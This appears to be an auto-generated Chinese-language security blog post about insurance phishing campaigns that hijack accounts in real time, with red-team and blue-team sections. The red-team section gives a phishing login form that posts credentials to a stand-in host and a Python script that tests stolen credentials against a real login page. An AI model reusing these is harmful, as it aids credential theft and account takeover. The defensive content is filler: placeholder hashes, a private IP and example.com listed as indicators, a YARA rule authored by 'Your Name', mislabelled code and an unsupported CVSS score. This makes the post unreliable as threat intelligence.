---
layout: post
title:  "CTM360 Research Reveals How Insurance Phishing Has Evolved Into Real-Time Account Hijacking"
date:   2026-07-25 13:08:09 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Insurance Phishing 攻擊：從傳統釣魚到即時帳戶劫持

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.0)
> * **受駭指標**: 即時帳戶劫持 (Real-time Account Hijacking)
> * **關鍵技術**: Phishing Kit、Real-time Data Collection、Backend Administration

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 Phishing Kit 對受害者進行即時帳戶劫持，無需等待受害者輸入帳戶密碼。
* **攻擊流程圖解**:
  1. 受害者點擊 Google Ads 廣告，導向假的保險網站。
  2. 假的保險網站收集受害者的帳戶資訊，包括使用者名稱和密碼。
  3. 攻擊者使用收集到的資訊，對真正的保險網站進行實時驗證。
  4. 攻擊者成功驗證後，取得受害者的帳戶存取權。
* **受影響元件**: 保險公司的網站和客戶資料。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 Google Ads 廣告的發佈權限和 Phishing Kit 的存取權限。
* **Payload 建構邏輯**:

    ```
    
    python
      # 假的保險網站的 HTML 代碼
      <html>
      <body>
        <form action="https://example.com/submit" method="post">
          <input type="text" name="username" placeholder="使用者名稱">
          <input type="password" name="password" placeholder="密碼">
          <input type="submit" value="登入">
        </form>
      </body>
      </html>
    
    ```
 

```

python
  # 攻擊者使用的 Phishing Kit 代碼
  import requests

  def get_credentials():
    # 收集受害者的帳戶資訊
    username = input("使用者名稱: ")
    password = input("密碼: ")
    return username, password

  def validate_credentials(username, password):
    # 對真正的保險網站進行實時驗證
    url = "https://example.com/login"
    data = {"username": username, "password": password}
    response = requests.post(url, data=data)
    if response.status_code == 200:
      return True
    else:
      return False

  username, password = get_credentials()
  if validate_credentials(username, password):
    print("帳戶驗證成功!")
  else:
    print("帳戶驗證失敗!")

```
* **繞過技術**: 攻擊者可以使用各種技術來繞過安全防護，例如使用 VPN 或 Proxy 伺服器來隱藏 IP 地址。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /var/www/html/index.html |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Insurance_Phishing {
        meta:
          description = "偵測保險釣魚攻擊"
          author = "Your Name"
        strings:
          $html = "<html><body><form action=\"https://example.com/submit\" method=\"post\">"
        condition:
          $html at 0
      }
    
    ```
* **緩解措施**: 保險公司可以採取以下措施來防禦此類攻擊：
  1. 加強網站安全性，例如使用 HTTPS 和 WAF。
  2. 提高客戶的安全意識，例如教育客戶如何辨別假的保險網站。
  3. 監控網站的異常行為，例如使用 SIEM 系統。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Phishing Kit**: 一種用於創建和管理假的網站的工具，通常用於釣魚攻擊。
* **Real-time Data Collection**: 即時收集和處理數據的技術，通常用於釣魚攻擊中。
* **Backend Administration**: 後端管理的技術，通常用於管理和維護網站的後端系統。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/ctm360-research-reveals-how-insurance.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1189/)


